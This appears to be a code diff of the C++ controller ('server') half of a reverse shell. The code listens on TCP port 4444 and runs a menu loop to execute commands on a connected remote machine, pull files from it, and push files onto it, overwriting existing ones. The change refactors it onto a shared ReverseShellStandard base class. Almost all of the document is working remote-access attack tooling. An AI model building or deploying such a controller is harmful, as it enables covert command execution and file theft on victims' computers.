@@ -1,12 +1,10 @@
 #pragma once
 
-#include <fstream>
-#include <boost/asio.hpp>
-#include <memory>
-#include <filesystem>
-#include <iostream>
+#define _WIN32_WINDOWS 0x0A00
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+
 #include <stdlib.h>
-#include "../CommonReverseShell/Functions.hpp"
+#include "ReverseShellStandardFunctions.hpp"
 
 // TODO - take this function to "common utils"
 std::string EnvVariable(const std::string& envVariable)
@@ -17,25 +15,59 @@ std::string EnvVariable(const std::string& envVariable)
 }
 
 
-class Session : public std::enable_shared_from_this<Session>
+class Server : ReverseShellStandard
 {
-private:
-    using TcpSocket = boost::asio::ip::tcp::socket;
-
 public:
-    Session(TcpSocket socket)
-        : m_socket(std::move(socket)), m_ShellUtils(this)
+    Server()
+        : ReverseShellStandard()
     {
+        std::cout << "Server started" << std::endl;
+        Connect();
         ClientDedicatedDirectory();
-        m_ShellUtils.Start();
+        Start();
+        m_ioService.run();
     }
 
 private:
+
+    void Connect() override final
+    {
+        auto endpoint = boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), 4444);
+        auto acceptor = boost::asio::ip::tcp::acceptor(m_ioService, endpoint);
+        acceptor.accept(m_socket, m_errorCode);
+        if (m_errorCode)
+            throw; // TODO - throw specific
+    }
+
     void ClientDedicatedDirectory()
     {
         SetClientDedicatedDirectory();
         CreateClientDedicatedDirectory();
         std::filesystem::current_path(m_clientDedicatedDirectory);
+    }
+
+    void Start()
+    {
+        while (true)
+        {
+            switch (ReadOperationType())
+            {
+            case RUN_COMMAND:
+                RunCommand();
+                break;
+            case DOWNLOAD_FILE:
+                DownloadFile();
+                break;
+            case UPLOAD_FILE:
+                UploadFile();
+                break;
+            default:
+                InvalidOperation();
+                break;
+            }
+
+            m_responseBuf.consume(m_responseBuf.size());
+        }
     }
 
     void SetClientDedicatedDirectory()
@@ -52,13 +84,13 @@ private:
         std::cout << "Created directory: " << m_clientDedicatedDirectory << std::endl;
     }
 
-    SharedReverseShellUtils<Session>::OperationType ReadOperationType()
+    OperationType ReadOperationType()
     {
         PrintOptionsMenu();
         std::string operation;
         std::getline(std::cin >> std::ws, operation);
 
-        return m_ShellUtils.GetOperationType(operation);
+        return GetOperationType(operation);
     }
 
     void PrintOptionsMenu()
@@ -70,12 +102,12 @@ private:
             << "[+] Your choise - ";
     }
 
-    void Command()
+    void RunCommand() override final
     {
         auto command = ReadOperationInstruction("Write command");
-        m_ShellUtils.Send("1");
-        m_ShellUtils.Send(command);
-        auto commandOutput = m_ShellUtils.Response();
+        Send(1);
+        Send(command);
+        auto commandOutput = Response();
         std::cout << std::endl << commandOutput << std::endl;
     }
 
@@ -94,24 +126,24 @@ private:
             string = string.substr(1, string.length() - 2);
     }
 
-    void Download()
+    void DownloadFile()
     {
         auto filePath = ReadOperationInstruction("Source path (remote)");
-        m_ShellUtils.Send("2");
-        m_ShellUtils.Send(filePath);
+        Send(2);
+        Send(filePath);
 
-        if (m_ShellUtils.Response() == "0")
+        if (Response() == "0")
         {
             std::cout << "Client doesn't have the file:  " << filePath << std::endl;
             return;
         }
 
         auto fileToCreate = CreateFileLocally(filePath);
-        m_ShellUtils.Download(filePath);
+        ReverseShellStandard::DownloadFile(filePath);
         std::cout << "File downloaded to - " << fileToCreate << std::endl;
     }
 
-    void Upload()
+    void UploadFile()
     {
         auto localFilePath = ReadOperationInstruction("Source path (local)");
         if (!IsRegularFileExists(localFilePath))
@@ -121,13 +153,13 @@ private:
         }
 
         auto destinationFilePath = ReadOperationInstruction("Destination path (remote)");
-        m_ShellUtils.Send("3");
-        m_ShellUtils.Send(destinationFilePath);
+        Send(3);
+        Send(destinationFilePath);
         
-        if (m_ShellUtils.Response() != "0")
+        if (Response() != "0")
             std::cout << destinationFilePath << " already exists on the client. It will be overwitten!" << std::endl;
 
-        m_ShellUtils.Upload(localFilePath);
+        ReverseShellStandard::UploadFile(localFilePath);
         std::cout << "File uploaded to (remote): " << destinationFilePath << std::endl;
     }
 
@@ -140,46 +172,42 @@ private:
     {
         auto fileName = std::filesystem::path(filePath).filename().string();
         auto fileToCreate = (std::filesystem::path(m_clientDedicatedDirectory) / fileName).string();
-        m_ShellUtils.OpenFileFor(fileToCreate, std::ios::out | std::ios::binary);
+        OpenFileFor(fileToCreate, std::ios::out | std::ios::binary);
 
         return fileToCreate;
     }
 
-
-    TcpSocket m_socket;
-    SharedReverseShellUtils<Session> m_ShellUtils;
     std::string m_clientDedicatedDirectory; // Convert this to a map of IP-directoryPath so it could handle multiple clients
 
-    friend class SharedReverseShellUtils<Session>;
 };
 
 
-class Server
-{
-public:
-
-    Server()
-        : m_ioService(boost::asio::io_service()), m_socket(m_ioService), m_acceptor(m_ioService, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), 4444))
-    {
-        std::cout << "Server started" << std::endl;
-        AcceptConnection();
-        m_ioService.run();
-    }
-
-private:
-
-    void AcceptConnection()
-    {
-        m_acceptor.async_accept(m_socket, [this](boost::system::error_code ec)
-            {
-                if (!ec)
-                    std::make_shared<Session>(std::move(m_socket));
-
-                AcceptConnection();
-            });
-    }
-
-    boost::asio::io_service m_ioService;
-    boost::asio::ip::tcp::socket m_socket;
-    boost::asio::ip::tcp::acceptor m_acceptor;
-};
+//class Server
+//{
+//public:
+//
+//    Server()
+//        : m_ioService(boost::asio::io_service()), m_socket(m_ioService), m_acceptor(m_ioService, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), 4444))
+//    {
+//        std::cout << "Server started" << std::endl;
+//        AcceptConnection();
+//        m_ioService.run();
+//    }
+//
+//private:
+//
+//    void AcceptConnection()
+//    {
+//        m_acceptor.async_accept(m_socket, [this](boost::system::error_code ec)
+//            {
+//                if (!ec)
+//                    std::make_shared<Session>(std::move(m_socket));
+//
+//                AcceptConnection();
+//            });
+//    }
+//
+//    boost::asio::io_service m_ioService;
+//    boost::asio::ip::tcp::socket m_socket;
+//    boost::asio::ip::tcp::acceptor m_acceptor;
+//};
